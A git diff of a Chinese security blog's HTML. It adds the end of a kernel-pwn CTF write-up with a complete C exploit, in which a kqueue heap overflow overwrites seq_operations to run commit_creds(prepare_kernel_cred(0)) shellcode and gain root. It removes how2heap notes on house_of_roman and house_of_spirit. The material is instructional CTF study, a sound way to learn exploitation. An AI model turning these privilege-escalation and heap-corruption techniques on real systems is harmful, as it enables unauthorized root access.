class="number">0x200</span>; i++)</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    ioctl(fd, CREATE_KQUEUE, &amp;create_req);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这是进入ioctl函数中内核的执行情况，在kmalloc分配到内存后，查看周围的内存环境，发现有大量的重复内容，推测这就是前面0x200次打开stat文件申请到的seq_operations结构体。</p>
+<p><img src="5.png" alt="" /><br />
+我们可以在IDA中打开vmlinux，找到执行start函数指针的位置（函数名为seq_read）：<br />
+<img src="6.png" alt="" /><br />
+其与内核基址地址的差为0x201179。再找到<code>commit_creds</code>和<code>prepare_kernel_cred</code>的基址：<br />
+prepare_kernel_cred：偏移0x8C580。<br />
+<img src="7.png" alt="" /><br />
+commit_creds：偏移0x8C140<br />
+<img src="https://img-blog.csdnimg.cn/397f050e23dc49e4a4ec2287a2ed1400.png" alt="在这里插入图片描述" /><br />
+在调用start前，内核将下一条指令的地址压入栈中，我们利用的就是这个地址，来获取内核的加载基址，进而执行<code>commit_cred(prepare_kernel_cred(NULL))</code>函数。自然地，我们可以写一个shellcode来完成这件事情。由于本题没有开启SMEP，因此我们可以直接用用户态的shellcode地址覆盖seq_operations中的地址，内核可以执行用户态的shellcode。</p>
+<p>注意在save函数中，其申请的空间大小是queue-&gt;queue_size，我们之前传入的max_entries为0xFFFFFFFF，这使得queue-&gt;queue_size=0x20，即新申请的空间与seq_operations在相近的位置。然而其拷贝的实际长度为request.data_size，可以产生溢出。当request.max_entries=0时，拷贝的循环不会执行，而是只会执行循环前面的memcpy，将queue-&gt;data拷贝到新空间中，因此，如果我们在queue-&gt;data中写入shellcode的地址，就有覆盖一个seq_operations结构体的可能性。经过测试证明，当queue-&gt;data传入0x40的时候，溢出0x20个字节正好能够覆盖一个seq_operations结构体。</p>
+<p>最终的exp：（头文件在上面，不变）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-13.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap_overflow.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">size_t</span> sh = (<span class="type">size_t</span>)getShell;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shellcode</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov r11, [rsp + 0x8];&quot;</span></span><br><span class="line">            <span class="string">&quot;sub r11, 0x201179;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;add r12, 0x8C580;&quot;</span>     <span class="comment">// prepare_kernel_cred</span></span><br><span class="line">            <span class="string">&quot;add r11, 0x8C140;&quot;</span>     <span class="comment">// commit_creds</span></span><br><span class="line">            <span class="string">&quot;xor rdi, rdi;&quot;</span></span><br><span class="line">            <span class="string">&quot;call r12;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, rax;&quot;</span></span><br><span class="line">            <span class="string">&quot;call r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, user_ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, user_sp;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, user_rflags;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, user_cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, sh;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;iretq;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> seq_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="type">size_t</span> data[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        error_log(<span class="string">&quot;Cannot open /dev/kqueue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x20</span>; i++)</span><br><span class="line">        data[i] = (<span class="type">size_t</span>)shellcode;</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> create_req = &#123;</span><br><span class="line">            .max_entries = <span class="number">0xFFFFFFFF</span>,</span><br><span class="line">            .data_size = <span class="number">0x20</span> * <span class="number">8</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, CREATE_KQUEUE, &amp;create_req);</span><br><span class="line">    info_log(<span class="string">&quot;queue created.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> edit_req = &#123;</span><br><span class="line">            .queue_idx = <span class="number">0</span>,</span><br><span class="line">            .entry_idx = <span class="number">0</span>,</span><br><span class="line">            .data = (<span class="type">char</span>*)data,</span><br><span class="line">    &#125;;</span><br><span class="line">    info_log(<span class="string">&quot;ready to edit queue, content below:&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)data, <span class="number">0x100</span>);</span><br><span class="line">    ioctl(fd, EDIT_KQUEUE, &amp;edit_req);</span><br><span class="line">    info_log(<span class="string">&quot;queue edited.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    info_log(<span class="string">&quot;0x200 stat file opened.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> save_req = &#123;</span><br><span class="line">            .queue_idx = <span class="number">0</span>,</span><br><span class="line">            .max_entries = <span class="number">0</span>,</span><br><span class="line">            .data_size = <span class="number">0x40</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, SAVE, &amp;save_req);</span><br><span class="line">    info_log(<span class="string">&quot;queue saved.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;ready to read stat file...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)</span><br><span class="line">        read(seq_fd[i], data, <span class="number">1</span>);</span><br><span class="line">    info_log(<span class="string">&quot;stat file reading completed.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>提权成功。（虽然不是以#开头但可以读取flag文件）<br />
+<img src="8.png" alt="" /><br />
+在内核态堆溢出题中，我们需要充分利用“大小相等的内存块可能会被分配到相邻位置”这一特性溢出覆盖。内核中的内存块空间没有用户态那样的块首结构，需要注意。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1942,495 +2117,10 @@ Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p>
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's BLOG">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-3/" class="post-title-link" itemprop="url">how2heap 深入学习(3)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-02-28 22:20:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:20:00+08:00">2023-02-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-03-02 16:17:06" itemprop="dateModified" datetime="2023-03-02T16:17:06+08:00">2023-03-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/glibc-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">glibc 系列</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>9.4k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>9 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>how2heap下载网址: <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">传送门</a><br />
-Glibc源码查看网址：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source">传送门</a><br />
-参考书籍：CTF竞赛权威指南-pwn篇</p>
-<p>测试环境：Ubuntu 16.04<br />
-Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p>
-<p>前两周事情比较多，暂停了pwn的复习，今天继续。<br />
-按照顺序，本文分析glibc 2_23文件夹中的第9~11个源码。</p>
-<h1 id="9-house_of_roman"><a class="markdownIt-Anchor" href="#9-house_of_roman"></a> 9. house_of_roman</h1>
-<p>这是一种需要进行暴力猜解的漏洞，在开启PIE时仍然有效。我们来看下源码是如何操作的。</p>
-<h2 id="step-1-控制__malloc_hook"><a class="markdownIt-Anchor" href="#step-1-控制__malloc_hook"></a> Step 1: 控制__malloc_hook</h2>
-<p>首先创建了4个chunk，大小分别为0x70, 0x90, 0x90, 0x70。</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">number</th>
-<th style="text-align:center">size</th>
-<th style="text-align:center">name</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">1</td>
-<td style="text-align:center">0x70</td>
-<td style="text-align:center">fastbin_victim</td>
-</tr>
-<tr>
-<td style="text-align:center">2</td>
-<td style="text-align:center">0x90</td>
-<td style="text-align:center">&lt;anonymous&gt;</td>
-</tr>
-<tr>
-<td style="text-align:center">3</td>
-<td style="text-align:center">0x90</td>
-<td style="text-align:center">main_arena_use</td>
-</tr>
-<tr>
-<td style="text-align:center">4</td>
-<td style="text-align:center">0x70</td>
-<td style="text-align:center">relative_offset_heap</td>
-</tr>
-</tbody>
-</table>
-<p>之后将第3个chunk释放，其fd和bk指针将指向main_arena + 0x68的位置。</p>
-<p>接下来再分配一个0x70大小的chunk(name: fake_libc_chunk)，分配后原先的unsorted bin会被分割一部分，剩下0x21大小仍为unsorted bin，而此时在fake_libc_chunk中已经有了main_arena + 0x68的地址了。</p>
-<p>后面，依次释放relative_offset_heap和fastbin_victim。此时bins的结构为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x555555757000 &lt;fastbin_victim&gt; —▸ 0x555555757190 &lt;relative_offset_heap&gt;◂— 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757170 &lt;main_arena_use的一部分&gt; —▸ 0x7ffff7bcdb78 (main_arena+88) ◂— 0x555555757170 /* &#x27;pquUUU&#x27; */</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
-<p>堆的结构为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757000</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x555555757190</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555757070</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555757100</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757170</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7ffff7bcdb78</span><br><span class="line">bk: 0x7ffff7bcdb78</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins)</span><br><span class="line">Addr: 0x555555757190</span><br><span class="line">Size: 0x70</span><br><span class="line">fd: 0x00</span><br></pre></td></tr></table></figure>
-<p>之后，将第一个chunk的fd指针部分覆盖（覆盖最低1字节为0），那么此时第一个chunk指向的就是0x555555757100处，也就是刚分配的0x70空间的首部。此操作完成之后，堆结构变为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757000</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x555555757100</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555757070</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757100</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x7ffff7bcdbf8</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757170</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7ffff7bcdb78</span><br><span class="line">bk: 0x7ffff7bcdb78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555757190</span><br><span class="line">Size: 0x70</span><br></pre></td></tr></table></figure>
-<p>bins的结构为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x555555757000 —▸ 0x555555757100 —▸ 0x7ffff7bcdbf8 (main_arena+216) ◂— 0x7ffff7bcdbf8</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757170 —▸ 0x7ffff7bcdb78 (main_arena+88) ◂— 0x555555757170 /* &#x27;pquUUU&#x27; */</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
-<p>之后，我们就可以将0x555555757100（此时实际上并不是freed chunk）的fd指针修改为malloc_hook - 0x23。但是由于开启了PIE，因此需要爆破4个比特位，即16选1。</p>
-<font color=red>
-注意：PIE会对地址进行随机化处理，但是一页之内的地址还是一样的，也就是说，开启和不开启PIE时地址的最低12bit是完全相同的。我们可以获取libc中malloc_hook的相对地址，其低12bit可以获得，但覆盖是整个字节覆盖，因此我们需要猜解随机化地址的倒数第2低字节中的高4位。
-</font>
-<p>覆盖地址为0x555555757100的chunk的fd指针的低2字节，如果爆破成功，后面连续分配两个0x70大小chunk后再分配一个即将fastbin挟持到__malloc_hook。</p>
-<p>这是__malloc_hook前面一部分内存空间的情况。</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">addr</th>
-<th style="text-align:center">+0</th>
-<th style="text-align:center">+1</th>
-<th style="text-align:center">+2</th>
-<th style="text-align:center">+3</th>
-<th style="text-align:center">+4</th>
-<th style="text-align:center">+5</th>
-<th style="text-align:center">+6</th>
-<th style="text-align:center">+7</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">0x7ffff7bcdae8</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-</tr>
-<tr>
-<td style="text-align:center">0x7ffff7bcdaf0(_IO_wide_data_0+304)</td>
-<td style="text-align:center">60</td>
-<td style="text-align:center">c2</td>
-<td style="text-align:center">bc</td>
-<td style="text-align:center">f7</td>
-<td style="text-align:center">ff</td>
-<td style="text-align:center"><font color=red>7f</font></td>
-<td style="text-align:center"><font color=red>00</font></td>
-<td style="text-align:center"><font color=red>00</font></td>
-</tr>
-<tr>
-<td style="text-align:center">0x7ffff7bcdaf8</td>
-<td style="text-align:center"><font color=red>00</font></td>
-<td style="text-align:center"><font color=red>00</font></td>
-<td style="text-align:center"><font color=red>00</font></td>
-<td style="text-align:center"><font color=red>00</font></td>
-<td style="text-align:center"><font color=red>00</font></td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-</tr>
-<tr>
-<td style="text-align:center">0x7ffff7bcdb00(__memalign_hook)</td>
-<td style="text-align:center">a0</td>
-<td style="text-align:center">ee</td>
-<td style="text-align:center">88</td>
-<td style="text-align:center">f7</td>
-<td style="text-align:center">ff</td>
-<td style="text-align:center">7f</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-</tr>
-<tr>
-<td style="text-align:center">0x7ffff7bcdb08(__realloc_hook)</td>
-<td style="text-align:center">70</td>
-<td style="text-align:center">ea</td>
-<td style="text-align:center">88</td>
-<td style="text-align:center">f7</td>
-<td style="text-align:center">ff</td>
-<td style="text-align:center">7f</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-</tr>
-<tr>
-<td style="text-align:center">0x7ffff7bcdb10(__malloc_hook)</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-</tr>
-</tbody>
-</table>
-<p>我们现在解释为什么要将地址挟持到__malloc_hook - 0x23处。</p>
-<font color=red>
-fastbin的重新分配会进行一个检查：后面一个fastbin的大小是否在fastbin可以容纳的chunk的大小范围之内。因此我们需要转移到一个这样一个地址，这个地址后面对应的size域有一个0x20~0x80的值。看到上面的表，我们想借用7f。如何借用？注意到0x7ffff7bcdaf5处有一个7f（这个7f一般是固定不变的），而且这之后有10个字节都是0，如果我们从这里开始读8个字节，那值就正好是0x7f，不会超过0x80。所以考虑将0x7ffff7bcdaed作为chunk的头部，这样读取到的size就可以通过检查。
-</font>
-<h2 id="step-2-unsorted-bin-attack"><a class="markdownIt-Anchor" href="#step-2-unsorted-bin-attack"></a> Step 2: Unsorted bin attack</h2>
-<p>在第一步中，我们成功将fastbin挟持到了__malloc_hook处。但是由于libc的加载地址仍然未知，现在我们能做的仍然非常有限。因此下一步我们准备进行一次unsorted bin attack。</p>
-<p>首先分配一个0x90大小的chunk(name: unsorted_bin_ptr)，之后分配一个0x30大小的chunk防止unsorted bin与top chunk合并。下面就是常规的unsorted bin attack流程：</p>
-<p>释放unsorted_bin_ptr，利用UAF将其bk指针修改为__malloc_hook - 0x10（这里只需要修改最低2字节，而且这在第一步已经通过爆破获取）。然后将这个unsorted bin分配出来，这样main_arena + 0x68被修改为__malloc_hook - 0x10，同时__malloc_hook被修改为main_arena + 0x68（这是双向链表中元素脱链的标准操作，即要脱链的为chunk，则需将chunk-&gt;bk-&gt;fd指向main_arena + 0x68，main_arena + 0x68指向chunk-&gt;bk，图示如下）</p>
-<p><img src="1.png" alt="" /></p>
-<h2 id="step-3-getshell"><a class="markdownIt-Anchor" href="#step-3-getshell"></a> Step 3: getshell</h2>
-<p>之后，我们需要利用挟持到__malloc_hook的chunk部分修改__malloc_hook的值。首先，我们在第一步已经通过爆破获取了__malloc_hook地址的低2字节，根据这低2字节，我们可以在libc中获取到system加载地址的低2字节。</p>
-<p>例如，libc6_2.23-0ubuntu11.3_amd64版本中system地址为0x453a0，__malloc_hook地址为0x3c4b10。假如爆破成功时__malloc_hook加载地址的低2字节为0x8b10，那么说明加载地址等于相对地址加上(0x400 + n * 0x1000)。即system加载地址的低2字节应为0x93a0。</p>
-<p>我们获取到system地址的低2字节后，需要爆破system地址第3小的字节。注意到0x3c4b10 - 0x453a0 = 0x37f770，system的地址和__malloc_hook的地址除低3字节外剩余部分很有可能相等。因此只对第3小的字节进行爆破即可。</p>
-<p>随机猜解system地址如果成功，在之后进行malloc，参数可以填one_gadget，这样就可以成功获取shell。</p>
-<p>综上所述，house_of_roman一共需要爆破12比特位，加上加载地址可能造成的影响，爆破成功的概率应该略低于 1 / 2^12，多试几次就可以getshell。</p>
-<h1 id="10-house_of_spirit"><a class="markdownIt-Anchor" href="#10-house_of_spirit"></a> 10. house_of_spirit</h1>
-<p>这是一种常用的堆漏洞，核心思想也很简单：在目标地址伪造一个chunk并引导libc将这块内存释放，下一次malloc即可分配到目标地址处。</p>
-<p>这里需要注意的就是伪造堆块的方法。</p>
-<h2 id="重要_int_free函数的fastbin检查"><a class="markdownIt-Anchor" href="#重要_int_free函数的fastbin检查"></a> 重要：_int_free函数的fastbin检查：</h2>
-<ol>
-<li>
-<p>检查堆块的size是否过大到不切实际</p>
-</li>
-<li>
-<p>检查chunk是否对齐（x64的chunk头必须是0x8对齐的，即最低4bit只能为0或8）</p>
-</li>
-</ol>
-<p>上述两种检查如果没有通过，直接报错中止，源码如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">size = chunksize (p);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>检查size是否过小以及size是否对齐，即size不能小于0x20且在x64中也要是0x8对齐，否则报错中止。源码如下：</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<ol start="4">
-<li>检查下一个chunk的大小，不能小于<code>2 * SIZE_SZ</code>（即0x10），也不能大于<code>av-&gt;system_mem</code>（应该是一个很大的值），源码如下：</li>
-</ol>
